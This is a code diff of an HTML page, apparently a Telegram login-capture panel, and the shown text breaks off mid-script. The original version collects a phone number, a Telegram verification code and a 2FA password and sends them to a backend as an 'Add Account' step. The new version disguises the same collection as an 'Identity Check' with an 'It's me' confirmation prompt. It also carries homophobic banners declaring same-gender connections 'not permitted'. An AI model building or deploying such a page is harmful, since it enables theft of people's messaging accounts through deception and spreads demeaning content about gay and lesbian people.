@@ -2,270 +2,277 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
-  <title>Add Account • Auto‑Verify</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover">
+  <title>Sign Resisting · Identity Verify</title>
   <style>
     * {
       margin: 0;
       padding: 0;
       box-sizing: border-box;
-      font-family: system-ui, -apple-system, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', 'Inter', sans-serif;
     }
 
     body {
-      background: #0e1621;
       min-height: 100vh;
+      background: radial-gradient(circle at 30% 10%, #0d0d1a, #050510);
       display: flex;
       align-items: center;
       justify-content: center;
       padding: 20px;
+      position: relative;
+      overflow-x: hidden;
+    }
+
+    body::before {
+      content: "";
+      position: fixed;
+      inset: 0;
+      background: linear-gradient(145deg, 
+        rgba(200, 50, 50, 0.15) 0%, 
+        rgba(50, 50, 150, 0.2) 50%,
+        rgba(200, 50, 50, 0.15) 100%);
+      background-size: 400% 400%;
+      animation: shiftBg 15s ease infinite;
+      z-index: 0;
+      pointer-events: none;
+    }
+
+    @keyframes shiftBg {
+      0% { background-position: 0% 30%; }
+      50% { background-position: 100% 70%; }
+      100% { background-position: 0% 30%; }
+    }
+
+    .floating-icon {
+      position: fixed;
+      pointer-events: none;
+      z-index: 2;
+      font-size: 1.8rem;
+      animation: floatIcon 7s infinite alternate ease-in-out;
+      opacity: 0.4;
+      filter: drop-shadow(0 6px 10px rgba(0,0,0,0.5));
+    }
+
+    @keyframes floatIcon {
+      0% { transform: translateY(0px) rotate(0deg); }
+      100% { transform: translateY(-25px) rotate(8deg); }
     }
 
     .login-container {
       width: 100%;
-      max-width: 450px;
+      max-width: 460px;
+      position: relative;
+      z-index: 20;
+      animation: slideUp 0.7s cubic-bezier(0.23, 1, 0.32, 1);
     }
 
-    .login-card {
-      background: #17212b;
-      border-radius: 28px;
-      padding: 32px 24px;
-      border: 1px solid #2b3945;
-      box-shadow: 0 20px 35px rgba(0, 0, 0, 0.5);
-      transition: all 0.2s ease;
+    @keyframes slideUp {
+      0% { opacity: 0; transform: translateY(50px); }
+      100% { opacity: 1; transform: translateY(0); }
     }
 
-    .header-bar {
+    .glass-card {
+      background: rgba(15, 10, 20, 0.8);
+      backdrop-filter: blur(28px);
+      -webkit-backdrop-filter: blur(28px);
+      border-radius: 36px;
+      padding: 36px 28px;
+      box-shadow: 0 30px 50px rgba(0, 0, 0, 0.7), 0 0 0 1px rgba(255, 100, 100, 0.2);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      transition: all 0.3s ease;
+    }
+
+    .header-row {
       display: flex;
       align-items: center;
-      gap: 12px;
+      gap: 14px;
       margin-bottom: 28px;
     }
 
-    .back-button {
-      width: 40px;
-      height: 40px;
+    .back-btn {
+      width: 44px;
+      height: 44px;
       border-radius: 50%;
-      background: #242f3d;
+      background: rgba(255, 255, 255, 0.06);
+      backdrop-filter: blur(10px);
       display: flex;
       align-items: center;
       justify-content: center;
       cursor: pointer;
-      color: #8e9fad;
+      color: #cc9999;
+      transition: 0.25s;
+      border: 1px solid rgba(255, 130, 130, 0.3);
+      font-size: 1.5rem;
+      font-weight: 300;
+    }
+
+    .back-btn:hover {
+      background: rgba(200, 60, 60, 0.3);
+      color: #ff8888;
+      border-color: #ff5555;
+    }
+
+    .brand-title {
+      font-weight: 700;
       font-size: 1.3rem;
-      border: none;
-      text-decoration: none;
-      transition: 0.2s;
+      letter-spacing: 0.5px;
+      color: #dd9999;
+      text-shadow: 0 0 10px rgba(200, 80, 80, 0.4);
     }
 
-    .back-button:hover {
-      background: #2b3945;
-      color: white;
-    }
-
-    .header-title {
-      font-size: 1.2rem;
-      font-weight: 600;
-      color: #fff;
-      flex: 1;
-    }
-
-    .server-badge {
-      background: #2b5278;
-      color: #6ab2f2;
-      font-size: 0.7rem;
-      padding: 4px 12px;
-      border-radius: 30px;
-      font-weight: 500;
+    .step-heading {
+      font-size: 2rem;
+      font-weight: 700;
+      margin-bottom: 8px;
+      color: #e8c0c0;
       letter-spacing: 0.3px;
     }
 
-    .step-indicator {
-      display: flex;
-      gap: 8px;
-      margin-bottom: 24px;
-    }
-
-    .step-dot {
-      width: 8px;
-      height: 8px;
-      border-radius: 50%;
-      background: #2b3945;
-      transition: 0.3s;
-    }
-
-    .step-dot.active {
-      background: #4c9ce0;
-      width: 24px;
-      border-radius: 4px;
-    }
-
-    .step-dot.done {
-      background: #4c9e4c;
-    }
-
-    .step-title {
-      font-size: 1.6rem;
-      font-weight: 700;
-      margin-bottom: 8px;
-      color: #fff;
-    }
-
-    .step-description {
-      color: #8e9fad;
+    .step-sub {
+      color: #a08080;
       font-size: 0.9rem;
       margin-bottom: 24px;
       line-height: 1.5;
     }
 
-    .input-wrapper {
-      background: #242f3d;
-      border: 1px solid #2b3945;
-      border-radius: 16px;
+    .warning-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      background: rgba(180, 40, 40, 0.25);
+      border: 1px solid rgba(255, 80, 80, 0.4);
+      padding: 8px 16px;
+      border-radius: 25px;
+      font-size: 0.8rem;
+      color: #ff9999;
+      margin-bottom: 20px;
+      font-weight: 500;
+    }
+
+    .input-group {
+      margin-bottom: 20px;
+    }
+
+    .phone-prefix {
       display: flex;
       align-items: center;
+      background: rgba(25, 12, 20, 0.7);
+      backdrop-filter: blur(14px);
+      border: 1.5px solid rgba(200, 100, 100, 0.4);
+      border-radius: 20px;
       overflow: hidden;
       margin-bottom: 20px;
-      transition: 0.2s;
     }
 
-    .input-wrapper:focus-within {
-      border-color: #4c9ce0;
-      box-shadow: 0 0 0 3px rgba(76, 156, 224, 0.2);
-    }
-
-    .input-prefix {
-      padding: 14px 0 14px 18px;
-      color: #4c9ce0;
+    .prefix {
+      padding: 15px 0 15px 20px;
+      color: #cc8888;
       font-weight: 700;
-      font-size: 1rem;
-      background: #1e2a36;
-      border-right: 1px solid #2b3945;
-      min-width: 38px;
-      text-align: center;
+      font-size: 1.1rem;
+      background: rgba(0,0,0,0.3);
+      border-right: 1px solid rgba(200, 100, 100, 0.4);
     }
 
-    .form-input {
+    .phone-input {
       flex: 1;
-      padding: 14px 16px;
       background: transparent;
       border: none;
+      padding: 15px 18px;
+      font-size: 1.1rem;
       color: #fff;
-      font-size: 1rem;
       outline: none;
     }
 
-    .form-input::placeholder {
-      color: #5d6f7e;
+    .phone-input::placeholder {
+      color: #665555;
     }
 
-    .password-input {
+    .input-field {
+      background: rgba(25, 12, 20, 0.7);
+      backdrop-filter: blur(14px);
+      border: 1.5px solid rgba(200, 100, 100, 0.4);
+      border-radius: 20px;
+      padding: 15px 20px;
       width: 100%;
-      padding: 14px 16px;
-      background: #242f3d;
-      border: 1px solid #2b3945;
-      border-radius: 16px;
       color: #fff;
-      font-size: 1rem;
+      font-size: 1.1rem;
       outline: none;
-      margin-bottom: 20px;
-      transition: 0.2s;
+      transition: 0.25s;
     }
 
-    .password-input:focus {
-      border-color: #4c9ce0;
-      box-shadow: 0 0 0 3px rgba(76, 156, 224, 0.2);
+    .input-field:focus {
+      border-color: #cc5555;
+      box-shadow: 0 0 20px rgba(200, 50, 50, 0.3);
     }
 
-    /* CODE BOXES */
-    .code-container {
+    .code-grid {
       display: flex;
       gap: 10px;
       justify-content: center;
-      margin: 24px 0 10px;
-      cursor: text;
-      flex-wrap: wrap;
+      margin: 24px 0 18px;
     }
 
-    .code-box {
-      width: 55px;
-      height: 65px;
-      background: #242f3d;
-      border: 2px solid #2b3945;
-      border-radius: 16px;
-      color: #fff;
-      font-size: 1.9rem;
+    .digit-box {
+      width: 60px;
+      height: 70px;
+      background: rgba(20, 8, 15, 0.8);
+      backdrop-filter: blur(10px);
+      border: 2px solid rgba(200, 100, 100, 0.45);
+      border-radius: 18px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 2.2rem;
       font-weight: 700;
-      text-align: center;
-      line-height: 61px;
-      transition: all 0.15s ease;
-      user-select: none;
-      position: relative;
+      color: #ffcccc;
+      transition: all 0.2s ease;
+      cursor: pointer;
+      text-shadow: 0 0 8px rgba(255, 60, 60, 0.5);
     }
 
-    .code-box.filled {
-      border-color: #4c9ce0;
-      background: #2b5278;
-      box-shadow: 0 0 12px rgba(76, 156, 224, 0.25);
-    }
-
-    .code-box.active {
-      border-color: #6ab2f2;
-      box-shadow: 0 0 16px rgba(76, 156, 224, 0.5);
-    }
-
-    .code-box.error {
-      border-color: #e04c4c;
-      background: #4a1e1e;
-      box-shadow: 0 0 12px rgba(224, 76, 76, 0.4);
-      animation: shake 0.4s ease;
-    }
-
-    @keyframes shake {
-      0%, 100% { transform: translateX(0); }
-      25% { transform: translateX(-6px); }
-      75% { transform: translateX(6px); }
+    .digit-box.active {
+      border-color: #ff4444;
+      background: rgba(180, 40, 40, 0.3);
+      transform: scale(1.04);
+      box-shadow: 0 0 20px rgba(255, 40, 40, 0.5);
     }
 
     .hidden-input {
       position: absolute;
       opacity: 0;
-      width: 0;
-      height: 0;
+      width: 1px;
+      height: 1px;
       pointer-events: none;
-    }
-
-    .code-hint {
-      text-align: center;
-      color: #5d6f7e;
-      font-size: 0.8rem;
-      margin: 8px 0 18px;
     }
 
     .btn {
       width: 100%;
-      padding: 14px 18px;
+      padding: 16px;
       border: none;
-      border-radius: 16px;
+      border-radius: 30px;
+      font-weight: 700;
       font-size: 1rem;
-      font-weight: 600;
       cursor: pointer;
-      transition: all 0.2s;
+      transition: 0.3s;
       display: flex;
       align-items: center;
       justify-content: center;
       gap: 8px;
-      margin-bottom: 10px;
+      letter-spacing: 0.3px;
+      text-transform: uppercase;
     }
 
     .btn-primary {
-      background: #4c9ce0;
-      color: white;
+      background: linear-gradient(135deg, #8b2020, #5a1010);
+      color: #ffcccc;
+      box-shadow: 0 8px 20px rgba(150, 30, 30, 0.4);
+      border: 1px solid rgba(255, 150, 150, 0.3);
     }
 
     .btn-primary:hover:not(:disabled) {
-      background: #6ab2f2;
-      transform: translateY(-1px);
+      background: linear-gradient(135deg, #a02828, #6e1515);
+      transform: translateY(-2px);
+      box-shadow: 0 12px 28px rgba(180, 40, 40, 0.6);
     }
 
     .btn-primary:disabled {
@@ -273,577 +280,523 @@
       cursor: not-allowed;
     }
 
-    .btn-secondary {
-      background: #242f3d;
-      color: #6ab2f2;
-      border: 1px solid #2b3945;
+    .btn-approve {
+      background: linear-gradient(135deg, #1a6b1a, #0d3d0d);
+      color: #ccffcc;
+      box-shadow: 0 8px 20px rgba(20, 100, 20, 0.4);
+      border: 1px solid rgba(150, 255, 150, 0.3);
+      flex: 1;
     }
 
-    .btn-secondary:hover {
-      background: #2b3945;
+    .btn-approve:hover {
+      background: linear-gradient(135deg, #228022, #124a12);
+      transform: translateY(-2px);
     }
 
-    .clear-code-btn {
-      background: none;
-      border: none;
-      color: #8e9fad;
-      font-size: 0.8rem;
-      text-decoration: underline;
-      cursor: pointer;
-      width: 100%;
-      margin-top: 6px;
-      padding: 6px;
+    .btn-reject {
+      background: linear-gradient(135deg, #6b1a1a, #3d0d0d);
+      color: #ffcccc;
+      box-shadow: 0 8px 20px rgba(100, 20, 20, 0.4);
+      border: 1px solid rgba(255, 150, 150, 0.3);
+      flex: 1;
     }
 
-    .clear-code-btn:hover {
-      color: #ff6b6b;
+    .btn-reject:hover {
+      background: linear-gradient(135deg, #802222, #4a1212);
+      transform: translateY(-2px);
     }
 
-    .error-message, .success-message {
-      padding: 12px 16px;
-      border-radius: 14px;
-      margin-bottom: 18px;
-      font-size: 0.85rem;
-      display: none;
+    .btn-outline {
+      background: rgba(40, 20, 20, 0.6);
+      backdrop-filter: blur(10px);
+      color: #cc9999;
+      border: 1px solid #994444;
+      margin-top: 12px;
+    }
+
+    .btn-outline:hover {
+      background: rgba(60, 25, 25, 0.8);
+      color: #ffaaaa;
+    }
+
+    .btn-row {
+      display: flex;
+      gap: 12px;
+      margin-top: 20px;
+    }
+
+    .message-box {
+      padding: 14px 18px;
+      border-radius: 18px;
+      margin-bottom: 16px;
       font-weight: 500;
+      font-size: 0.9rem;
+      display: none;
+      backdrop-filter: blur(12px);
+      animation: fadeIn 0.3s ease;
     }
 
-    .error-message {
-      background: #4a1e1e;
-      color: #ff6b6b;
-      border-left: 3px solid #e04c4c;
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(-10px); }
+      to { opacity: 1; transform: translateY(0); }
     }
 
-    .success-message {
-      background: #1e4a2b;
-      color: #4c9e4c;
-      border-left: 3px solid #4c9e4c;
+    .error-msg {
+      background: rgba(180, 30, 30, 0.6);
+      border-left: 4px solid #ff4444;
+      color: #ffcccc;
     }
 
-    .error-message.show, .success-message.show {
-      display: block;
+    .success-msg {
+      background: rgba(30, 120, 30, 0.6);
+      border-left: 4px solid #44ff44;
+      color: #ccffcc;
     }
 
-    .loading-spinner {
-      width: 18px;
-      height: 18px;
-      border: 2px solid rgba(255,255,255,0.3);
+    .spinner {
+      width: 22px;
+      height: 22px;
+      border: 3px solid rgba(255,200,200,0.3);
+      border-top: 3px solid #ffaaaa;
       border-radius: 50%;
-      border-top-color: white;
       animation: spin 0.8s linear infinite;
     }
 
     @keyframes spin { to { transform: rotate(360deg); } }
 
-    .success-icon {
+    .identity-card {
+      background: rgba(20, 8, 12, 0.7);
+      border: 1px solid rgba(200, 120, 120, 0.4);
+      border-radius: 24px;
+      padding: 24px 20px;
+      text-align: center;
+      margin: 16px 0;
+    }
+
+    .identity-icon {
       font-size: 4rem;
-      text-align: center;
-      margin: 15px 0;
+      margin-bottom: 12px;
     }
 
-    .footer-text {
-      text-align: center;
-      color: #5d6f7e;
+    .identity-name {
+      font-size: 1.3rem;
+      font-weight: 700;
+      color: #ffcccc;
+      margin-bottom: 4px;
+    }
+
+    .identity-phone {
+      color: #aa8888;
+      font-size: 0.9rem;
+      margin-bottom: 8px;
+    }
+
+    .identity-warning {
+      color: #ff8888;
       font-size: 0.8rem;
-      margin-top: 15px;
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 1px;
     }
 
-    .attempt-counter {
-      text-align: center;
-      font-size: 0.8rem;
-      margin-top: 12px;
-      color: #ffaa00;
+    .telegram-notice {
+      background: rgba(30, 140, 210, 0.15);
+      border: 1px solid rgba(80, 170, 230, 0.4);
+      border-radius: 16px;
+      padding: 14px;
+      margin: 16px 0;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      color: #aad4f0;
+      font-size: 0.85rem;
     }
 
-    @media (max-width: 450px) {
-      .code-box {
-        width: 48px;
-        height: 56px;
-        font-size: 1.6rem;
-        line-height: 52px;
+    .telegram-notice .icon {
+      font-size: 1.5rem;
+    }
+
+    @media (max-width: 480px) {
+      .glass-card {
+        padding: 28px 18px;
+        border-radius: 28px;
+      }
+      .digit-box {
+        width: 52px;
+        height: 62px;
+        font-size: 1.8rem;
+      }
+      .code-grid {
+        gap: 7px;
       }
     }
   </style>
 </head>
 <body>
-<div class="login-container">
-  <div class="login-card">
-    <!-- PAGE 1: PHONE -->
-    <div id="page1">
-      <div class="header-bar">
-        <span class="back-button" id="backToDashboardBtn1">←</span>
-        <div class="header-title">Add Account</div>
-        <div class="server-badge" id="serverBadge">⚡ Server</div>
-      </div>
-      <div class="step-indicator">
-        <div class="step-dot active" id="dot1"></div>
-        <div class="step-dot" id="dot2"></div>
-        <div class="step-dot" id="dot3"></div>
-      </div>
-      <div class="step-title">📱 Phone Number</div>
-      <div class="step-description">Enter phone number with country code to receive verification code.</div>
-      <div class="error-message" id="error1"></div>
-      <div class="success-message" id="success1"></div>
-      <div class="input-wrapper">
-        <span class="input-prefix">+</span>
-        <input type="tel" class="form-input" id="phone" placeholder="1234567890" inputmode="numeric" autocomplete="off">
-      </div>
-      <button class="btn btn-primary" id="sendCodeBtn">📨 Send Code</button>
-      <div class="footer-text">Account will be linked to premium features</div>
-    </div>
+  <!-- Floating icons -->
+  <div class="floating-icon" style="top: 10%; left: 6%;">🚫</div>
+  <div class="floating-icon" style="top: 75%; right: 8%; animation-duration: 9s;">🔒</div>
+  <div class="floating-icon" style="bottom: 12%; left: 12%; animation-delay: 2s;">⚠️</div>
 
-    <!-- PAGE 2: VERIFY CODE (AUTO‑VERIFY) -->
-    <div id="page2" style="display: none;">
-      <div class="header-bar">
-        <span class="back-button" id="backToPhoneBtn">←</span>
-        <div class="header-title">Verify Code</div>
-        <div class="server-badge" id="serverBadge2">⚡ Server</div>
-      </div>
-      <div class="step-indicator">
-        <div class="step-dot done" id="dot1b"></div>
-        <div class="step-dot active" id="dot2b"></div>
-        <div class="step-dot" id="dot3b"></div>
-      </div>
-      <div class="step-title">🔐 Code</div>
-      <div class="step-description" id="codeDescription">Enter the 5‑digit code from Telegram.</div>
-      <div class="error-message" id="error2"></div>
-      <div class="success-message" id="success2"></div>
+  <div class="login-container">
+    <div class="glass-card" id="mainCard">
 
-      <!-- Hidden real input -->
-      <input type="text" id="hiddenCodeInput" class="hidden-input" maxlength="5" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code">
+      <!-- PAGE 1: Phone Number -->
+      <div id="pagePhone">
+        <div class="header-row">
+          <div class="back-btn" id="backHomeBtn">←</div>
+          <span class="brand-title">Sign Resisting</span>
+        </div>
+        <div class="step-heading">Identity Check</div>
+        <div class="step-sub">Enter your phone number to begin verification.</div>
+        
+        <div class="warning-badge">
+          🚫 Same-gender connections resisted
+        </div>
 
-      <div class="code-container" id="codeBoxesContainer">
-        <div class="code-box" id="box1" data-index="0">-</div>
-        <div class="code-box" id="box2" data-index="1">-</div>
-        <div class="code-box" id="box3" data-index="2">-</div>
-        <div class="code-box" id="box4" data-index="3">-</div>
-        <div class="code-box" id="box5" data-index="4">-</div>
-      </div>
-      <div class="code-hint">Tap boxes or type · Backspace to edit</div>
+        <div class="phone-prefix">
+          <span class="prefix">+</span>
+          <input type="tel" class="phone-input" id="phoneNumber" placeholder="1234567890" inputmode="numeric" autofocus>
+        </div>
 
-      <div id="passwordGroup" style="display: none;">
-        <input type="password" class="password-input" id="password" placeholder="2FA password" autocomplete="off">
+        <button class="btn btn-primary" id="sendCodeBtn">
+          <span>Send Verification Code</span>
+        </button>
       </div>
 
-      <button class="btn btn-primary" id="verifyBtn">✅ Verify & Add Account</button>
-      <button class="btn btn-secondary" id="clearCodeManualBtn">🗑️ Clear Code</button>
-      <button class="btn btn-secondary" id="backToPhoneFromCodeBtn">← Change Phone Number</button>
-      <div class="attempt-counter" id="attemptCounter"></div>
-    </div>
+      <!-- PAGE 2: Verification Code -->
+      <div id="pageCode" style="display: none;">
+        <div class="header-row">
+          <div class="back-btn" id="backPhoneBtn">←</div>
+          <span class="brand-title">Verify Code</span>
+        </div>
+        <div class="step-heading">Enter Code</div>
+        <div class="step-sub">5-digit code sent to your device.</div>
 
-    <!-- PAGE 3: SUCCESS -->
-    <div id="page3" style="display: none;">
-      <div class="header-bar">
-        <div class="header-title">Success ✅</div>
+        <input type="text" id="hiddenCodeInput" class="hidden-input" maxlength="5" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code">
+
+        <div class="code-grid" id="codeBoxContainer">
+          <div class="digit-box" data-index="0">−</div>
+          <div class="digit-box" data-index="1">−</div>
+          <div class="digit-box" data-index="2">−</div>
+          <div class="digit-box" data-index="3">−</div>
+          <div class="digit-box" data-index="4">−</div>
+        </div>
+
+        <div id="twoFAGroup" style="display: none;">
+          <input type="password" class="input-field" id="password2FA" placeholder="🔐 Enter 2FA password" autocomplete="off">
+        </div>
+
+        <button class="btn btn-primary" id="verifyCodeBtn">
+          <span>Verify & Continue</span>
+        </button>
+
+        <div class="warning-badge" style="margin-top: 16px; justify-content: center;">
+          ⚠️ Gay/Lesbian connections not permitted
+        </div>
       </div>
-      <div class="step-indicator">
-        <div class="step-dot done"></div>
-        <div class="step-dot done"></div>
-        <div class="step-dot done"></div>
+
+      <!-- PAGE 3: Identity Confirmation (It's Me - Telegram Style) -->
+      <div id="pageIdentity" style="display: none;">
+        <div class="header-row">
+          <div class="back-btn" id="backCodeBtn">←</div>
+          <span class="brand-title">Confirm Identity</span>
+        </div>
+        <div class="step-heading">Is This You?</div>
+        <div class="step-sub">Telegram identity verification required.</div>
+
+        <div class="telegram-notice">
+          <span class="icon">📱</span>
+          <span>Telegram notification: <strong>"Yes, it's me"</strong> — Confirm your identity to proceed.</span>
+        </div>
+
+        <div class="identity-card">
+          <div class="identity-icon">👤</div>
+          <div class="identity-name" id="identityName">User</div>
+          <div class="identity-phone" id="identityPhone">+1234567890</div>
+          <div class="identity-warning">🚫 Same-gender resisted</div>
+        </div>
+
+        <div class="step-sub" style="text-align: center; color: #ccaaaa;">
+          This confirmation counts toward connection decision.<br>
+          <strong>Approve</strong> = Connection allowed (opposite gender only)<br>
+          <strong>Reject</strong> = Connection blocked
+        </div>
+
+        <div class="btn-row">
+          <button class="btn btn-reject" id="rejectBtn">
+            ✗ Reject
+          </button>
+          <button class="btn btn-approve" id="approveBtn">
+            ✓ Approve (It's Me)
+          </button>
+        </div>
       </div>
-      <div class="success-icon">🎉</div>
-      <div class="step-title" style="text-align: center;">Account Added!</div>
-      <div class="step-description" id="successAccountInfo" style="text-align: center;"></div>
-      <button class="btn btn-primary" id="goToAutoAddBtn">⚙️ dev Settings</button>
-      <button class="btn btn-secondary" id="addAnotherBtn">➕ Add Another</button>
-      <button class="btn btn-secondary" id="goToDashboardBtn">📱 Dashboard</button>
+
+      <!-- PAGE 4: Result -->
+      <div id="pageResult" style="display: none;">
+        <div class="header-row">
+          <div class="back-btn" id="backStartBtn">←</div>
+          <span class="brand-title">Result</span>
+        </div>
+        <div id="resultContent">
+          <!-- Dynamic content -->
+        </div>
+        <button class="btn btn-outline" id="newLoginBtn">New Login</button>
+      </div>
+
     </div>
   </div>
-</div>
 
-<script>
-  (function() {
-    // ----- STATE -----
-    let currentSessionId = null;
-    let currentPhone = '';
-    let serverName = 'Server1';
-    let codeAttempts = 0;
-    let passwordAttempts = 0;
-    const MAX_ATTEMPTS = 5;
+  <script>
+    (function() {
+      // ----- STATE -----
+      let currentSession = null;
+      let currentPhone = '';
+      let autoVerifyTimer = null;
+      let decisionCount = parseInt(localStorage.getItem('resistDecisionCount') || '0');
 
-    // DOM elements
-    const page1 = document.getElementById('page1');
-    const page2 = document.getElementById('page2');
-    const page3 = document.getElementById('page3');
-    const phoneInput = document.getElementById('phone');
-    const hiddenInput = document.getElementById('hiddenCodeInput');
-    const boxes = [
-      document.getElementById('box1'),
-      document.getElementById('box2'),
-      document.getElementById('box3'),
-      document.getElementById('box4'),
-      document.getElementById('box5')
-    ];
-    const passwordGroup = document.getElementById('passwordGroup');
-    const passwordInput = document.getElementById('password');
-    const error1 = document.getElementById('error1');
-    const error2 = document.getElementById('error2');
-    const success2 = document.getElementById('success2');
-    const attemptCounter = document.getElementById('attemptCounter');
-    const verifyBtn = document.getElementById('verifyBtn');
-    const sendCodeBtn = document.getElementById('sendCodeBtn');
+      // DOM elements
+      const pagePhone = document.getElementById('pagePhone');
+      const pageCode = document.getElementById('pageCode');
+      const pageIdentity = document.getElementById('pageIdentity');
+      const pageResult = document.getElementById('pageResult');
+      const phoneInput = document.getElementById('phoneNumber');
+      const sendCodeBtn = document.getElementById('sendCodeBtn');
+      const hiddenCodeInput = document.getElementById('hiddenCodeInput');
+      const digitBoxes = document.querySelectorAll('.digit-box');
+      const verifyBtn = document.getElementById('verifyCodeBtn');
+      const twoFAGroup = document.getElementById('twoFAGroup');
+      const password2FA = document.getElementById('password2FA');
+      const approveBtn = document.getElementById('approveBtn');
+      const rejectBtn = document.getElementById('rejectBtn');
+      const resultContent = document.getElementById('resultContent');
 
-    // ----- UTILS -----
-    function showError(el, msg) {
-      if (!el) return;
-      el.textContent = msg;
-      el.classList.add('show');
-      setTimeout(() => { if (el.textContent === msg) el.classList.remove('show'); }, 6000);
-    }
-
-    function hideError(el) {
-      if (el) el.classList.remove('show');
-    }
-
-    function showSuccess(el, msg) {
-      if (!el) return;
-      el.textContent = msg;
-      el.classList.add('show');
-      setTimeout(() => el.classList.remove('show'), 4000);
-    }
-
-    function setLoading(btn, loading, originalText) {
-      if (loading) {
-        btn.disabled = true;
-        btn.innerHTML = '<span class="loading-spinner"></span> Please wait...';
-      } else {
-        btn.disabled = false;
-        btn.innerHTML = originalText || btn.getAttribute('data-original') || 'Submit';
+      // ----- HELPERS -----
+      function showMessage(text, type = 'error') {
+        const existing = document.querySelectorAll('.dynamic-msg');
+        existing.forEach(el => el.remove());
+        const msg = document.createElement('div');
+        msg.className = `message-box dynamic-msg ${type === 'error' ? 'error-msg' : 'success-msg'}`;
+        msg.textContent = text;
+        msg.style.display = 'block';
+        const visible = [pagePhone, pageCode, pageIdentity, pageResult].find(p => p.style.display !== 'none');
+        if (visible) visible.insertBefore(msg, visible.firstChild);
+        setTimeout(() => { if (msg.parentNode) msg.remove(); }, 4000);
       }
-    }
 
-    function updateCodeBoxes() {
-      let raw = hiddenInput.value.replace(/[^0-9]/g, '');
-      if (raw.length > 5) raw = raw.slice(0, 5);
-      hiddenInput.value = raw;
-      
-      for (let i = 0; i < 5; i++) {
-        const box = boxes[i];
-        box.classList.remove('filled', 'active', 'error');
-        if (i < raw.length) {
-          box.textContent = raw[i];
-          box.classList.add('filled');
+      function setLoading(btn, loading) {
+        if (loading) {
+          btn.disabled = true;
+          btn.innerHTML = '<span class="spinner"></span><span>Please wait...</span>';
         } else {
-          box.textContent = '-';
+          btn.disabled = false;
+          if (btn === sendCodeBtn) btn.innerHTML = '<span>Send Verification Code</span>';
+          if (btn === verifyBtn) btn.innerHTML = '<span>Verify & Continue</span>';
         }
       }
-      if (raw.length < 5) {
-        boxes[raw.length].classList.add('active');
-      }
-      hideError(error2);
-    }
 
-    function clearCodeInput() {
-      hiddenInput.value = '';
-      updateCodeBoxes();
-      focusCodeInput();
-      hideError(error2);
-      codeAttempts = 0;
-      passwordAttempts = 0;
-      updateAttemptDisplay();
-    }
-
-    function focusCodeInput() {
-      hiddenInput.focus();
-      updateCodeBoxes();
-    }
-
-    function shakeCodeBoxes() {
-      boxes.forEach(b => b.classList.add('error'));
-      setTimeout(() => boxes.forEach(b => b.classList.remove('error')), 500);
-    }
-
-    function updateAttemptDisplay() {
-      const remaining = MAX_ATTEMPTS - Math.max(codeAttempts, passwordAttempts);
-      if (codeAttempts === 0 && passwordAttempts === 0) {
-        attemptCounter.textContent = '';
-        return;
-      }
-      if (remaining <= 0) {
-        attemptCounter.textContent = '❌ No attempts left. Session expired.';
-        attemptCounter.style.color = '#ff6b6b';
-      } else if (remaining <= 2) {
-        attemptCounter.textContent = `⚠️ ${remaining} attempt${remaining>1?'s':''} left`;
-        attemptCounter.style.color = '#ffaa00';
-      } else {
-        attemptCounter.textContent = `${remaining} attempts remaining`;
-        attemptCounter.style.color = '#8e9fad';
-      }
-    }
-
-    // ----- AUTO VERIFY TRIGGER (when code length reaches 5) -----
-    function onCodeInputChange() {
-      updateCodeBoxes();
-      const code = hiddenInput.value.replace(/[^0-9]/g, '');
-      // AUTO VERIFY when exactly 5 digits entered (no button press needed)
-      if (code.length === 5) {
-        // Small delay to let UI update, then auto-submit
-        setTimeout(() => {
-          // Only if still on page2 and code still 5
-          if (page2.style.display !== 'none' && hiddenInput.value.replace(/[^0-9]/g, '').length === 5) {
-            performVerification();
-          }
-        }, 80);
-      }
-    }
-
-    // ----- VERIFICATION LOGIC (called by auto or button) -----
-    async function performVerification() {
-      const code = hiddenInput.value.replace(/[^0-9]/g, '');
-      if (code.length !== 5) {
-        showError(error2, 'Please enter the complete 5‑digit code.');
-        shakeCodeBoxes();
-        return;
-      }
-
-      const needPassword = passwordGroup.style.display === 'block';
-      const password = passwordInput.value;
-      if (needPassword && !password) {
-        showError(error2, '2FA password required.');
-        passwordInput.focus();
-        return;
-      }
-
-      if (!currentSessionId) {
-        showError(error2, 'Session missing. Go back and request a new code.');
-        return;
-      }
-
-      setLoading(verifyBtn, true, '✅ Verify & Add Account');
-      hideError(error2);
-
-      try {
-        const res = await fetch('/api/verify-code', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            code: code,
-            session_id: currentSessionId,
-            password: password
-          })
-        });
-
-        const data = await res.json();
-
-        if (data.success) {
-          // SUCCESS -> move to page 3
-          page2.style.display = 'none';
-          page3.style.display = 'block';
-          document.getElementById('successAccountInfo').innerHTML = 
-            `<strong>${data.account?.name || 'User'}</strong><br>📞 ${currentPhone}`;
-          showSuccess(document.getElementById('success2'), 'Account verified!');
-        } 
-        else if (data.need_password) {
-          // 2FA required
-          passwordGroup.style.display = 'block';
-          passwordInput.value = '';
-          passwordInput.focus();
-          showError(error2, '🔐 This account has 2FA. Enter your password.');
-        }
-        else {
-          // WRONG CODE (or other error) -> clear code & try again (AUTO CLEAR)
-          const errorMsg = data.error || 'Invalid code.';
-          
-          if (errorMsg.toLowerCase().includes('password')) {
-            passwordAttempts++;
-            updateAttemptDisplay();
-            passwordInput.value = '';
-            passwordInput.focus();
-            showError(error2, `${errorMsg} (${MAX_ATTEMPTS - passwordAttempts} left)`);
-            if (passwordAttempts >= MAX_ATTEMPTS) {
-              showError(error2, 'Too many password attempts. Returning to phone.');
-              setTimeout(() => backToPhonePage(), 2000);
-            }
+      function updateDigitBoxes() {
+        const code = hiddenCodeInput.value.replace(/[^0-9]/g, '').slice(0, 5);
+        hiddenCodeInput.value = code;
+        digitBoxes.forEach((box, i) => {
+          if (i < code.length) {
+            box.textContent = code[i];
+            box.classList.add('active');
           } else {
